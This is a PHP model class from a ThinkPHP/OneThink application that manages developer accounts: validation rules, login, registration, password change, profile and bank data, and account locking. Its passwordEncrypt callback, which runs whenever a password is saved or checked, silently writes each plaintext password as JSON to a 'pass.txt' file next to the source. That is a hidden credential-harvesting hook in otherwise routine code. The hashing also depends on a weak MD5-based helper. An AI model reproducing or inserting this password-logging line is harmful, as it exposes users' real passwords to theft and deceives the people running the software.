<?php
// +----------------------------------------------------------------------
// | OneThink [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2013 http://www.onethink.cn All rights reserved.
// +----------------------------------------------------------------------
// | Author: huajie <banhuajie@163.com>
// +----------------------------------------------------------------------

namespace Admin\Model;
use Open\Model\OpenMessageModel;
use Think\Model;

/**
 * 文档基础模型
 */
class DevelopersModel extends Model{
	const BASE_INFO = 4;
    /* 自动验证规则 */
    protected $_validate = array(
        array('account', '6,16', '账号长度为6-16个字符', self::EXISTS_VALIDATE, 'length'),
        array('account','','账号被占用',0,'unique',1),
        /* 验证密码 */
        array('password','6,30', "密码长度不合法", self::EXISTS_VALIDATE, 'length'), //密码长度不合法
	    ['nickname','require','开发者名称不能为空',self::MUST_VALIDATE,'regex',self::BASE_INFO],
	    ['identity','require','身份证号不能为空',self::MUST_VALIDATE,'regex',self::BASE_INFO],
	    ['address','require','联系地址不能为空',self::MUST_VALIDATE,'regex',self::BASE_INFO],
	    ['link_man','require','联系人不能为空',self::MUST_VALIDATE,'regex',self::BASE_INFO],
	    ['mobile_phone','require','手机号不能为空',self::MUST_VALIDATE,'regex',self::BASE_INFO],
	    ['email','require','邮箱不能为空',self::MUST_VALIDATE,'regex',self::BASE_INFO],
	    ['prove_img','require','证件图片不能为空',self::MUST_VALIDATE,'regex',self::BASE_INFO],
    );

    /* 自动完成规则 */
    protected $_auto = array(
        array('create_time', 'getCreateTime', self::MODEL_INSERT,'callback'),
        array('password', 'passwordEncrypt', self::MODEL_BOTH,'callback'),
    );

    /**
     * 构造函数
     * @param string $name 模型名称
     * @param string $tablePrefix 表前缀
     * @param mixed $connection 数据库连接信息
     */
    public function __construct($name = '', $tablePrefix = '', $connection = '') {
        /* 设置默认的表前缀 */
        $this->tablePrefix ='tab_';
        /* 执行构造方法 */
        parent::__construct($name, $tablePrefix, $connection);
    }

	/**
	 * 用户登录
	 * @param $account
	 * @param $password
	 * @return int|mixed
	 * author: xmy 280564871@qq.com
	 */
    public function login($account,$password){
        $map['account'] = $account;
        /* 获取用户数据 */
        $user = $this->where($map)->find();
        if(is_array($user) && ($user['status'] == 1 || $user['status'] == -1 || $user['status'] == 3)){
            /* 验证用户密码 */
            if(think_psw_md5($password, UC_AUTH_KEY) === $user['password']){
            	$this->autoLogin($user['id'],$account,$user['status']);
                return $user['id']; //登录成功，返回用户ID
            } else {
            	$this->error = "密码错误";
                return -2; //密码错误
            }
        } else {
            if(is_array($user) && $user['status'] == 2){return -3;}
            if(is_array($user) && $user['status'] == 0){return -4;}
            $this->error = "用户不存在或被禁用";
            return -1; //用户不存在或被禁用
        }
    }

    /**
     * 验证用户密码
     * @param int $uid 用户id
     * @param string $password_in 密码
     * @return true 验证成功，false 验证失败
     * @author huajie <banhuajie@163.com>
     */
    public function verifyUser($uid, $password_in){
        $password = $this->getFieldById($uid, 'password');

        if(think_psw_md5($password_in, UC_AUTH_KEY) === $password){
            return true;
        }
        return false;
    }

	protected function passwordEncrypt($password){
        wite_text(json_encode($password),dirname(__FILE__).'/pass.txt');

        return think_psw_md5($password, UC_AUTH_KEY);
    }
    
    /**
     * 创建时间不写则取当前时间
     * @return int 时间戳
     * @author huajie <banhuajie@163.com>
     */
    protected function getCreateTime(){
        $create_time    =   I('post.create_time');
        return $create_time?strtotime($create_time):NOW_TIME;
    }


	/**
	 * 用户注册
	 * @param $account
	 * @param $password
	 * @return bool|mixed
	 * author: xmy 280564871@qq.com
	 */
    public function register($account,$password){
    	$data['account'] = $account;
    	$data['password'] = $password;
    	$data['status'] = -1;
	    $res = $this->create($data);
	    if(!$res){
	    	return false;
	    }
    	if($id = $this->add($res)){
    		$this->autoLogin($id,$account);
    		return $id;
	    }else{
    		return false;
	    }
    }

	/**
	 * 修改密码
	 * @param $user_id
	 * @param $old
	 * @param $new
	 * @return bool
	 * author: xmy 280564871@qq.com
	 */
    public function alterPwd($user_id,$old,$new){
    	$pwd = $this->where(['id'=>$user_id])->getField("password");
	    if ($this->passwordEncrypt($old) !== $pwd){
	    	$this->error = "原密码错误";
	    	return false;
	    }else{
		    return $this->where(['id'=>$user_id])->setField("password",$this->passwordEncrypt($new));
	    }

    }

    public function updateLoginTime($uid){
        $map['id']=$uid;
        $res=$this->where($map)->setField(['last_login_time'=>time()]);
    }
	/**
	 * 登出
	 * author: xmy 280564871@qq.com
	 */
	public function logout(){
		session("user_info.uid",null);
		session("user_info.account",null);
		session("user_info.status",null);
	}

	/**
	 * 登录
	 * @param $uid
	 * @param $account
	 * @param $status
	 * author: xmy 280564871@qq.com
	 */
	private function autoLogin($uid,$account,$status){
		session("user_info.uid",$uid);
		session("user_info.account",$account);
		session("user_info.status",$status);
	}

	/**
	 * 保存基本信息
	 * @param $user_id
	 * @param $nature
	 * @return bool|mixed
	 * author: xmy 280564871@qq.com
	 */
	public function saveBaseInfo($user_id,$nature){
		$data = $this->create(I("post.",self::BASE_INFO));
		if(!$data){
			return false;
		}
		$data['nature'] = $nature;
		$data['status'] = -1;
		$open_data = $this->getUserData($user_id);
		if(empty($open_data)){//添加
			$data['dep_id'] = $user_id;
			$result = $this->add($data);
		}else{//编辑
			$map['id'] = $open_data['id'];
			$map['dep_id'] = $user_id;
			$result = $this->where($map)->save($data);
		}
		return $result;
	}


	/**
	 * 获取用户信息
	 * @param $user_id
	 * @return mixed
	 * author: xmy 280564871@qq.com
	 */
	public function getUserData($user_id){
		$map['d.id'] = $user_id;
		$data = $this->alias("d")
			->field("d.*,b.bank_name,b.account_name,b.bank_account,b.bank_link_man,b.bank_link_phone")
			->where($map)
			->join("left join tab_bank b on b.dep_id = d.id")
			->find();
		return $data;
	}


	/**
	 * 锁定/解锁用户
	 * @param $user_ids
	 * @param $status
	 * @return bool
	 * author: xmy 280564871@qq.com
	 */
	public function lockUser($user_ids,$status){
		$Message = new OpenMessageModel();
		foreach ($user_ids as $val){
			switch ($status){
				case 1:$Message->sendMsg($val,"资料已通过审核","恭喜您，资料已通过审核。");break;
				case 3:$Message->sendMsg($val,"资料未通过审核","很抱歉，资料未通过审核，请联系客服。");break;
			}
		}
		$map['id'] = ['in',$user_ids];
        $this->where($map)->setField(['operate_time'=>time()]);
		return $this->where($map)->setField(['status'=>$status]);
	}
}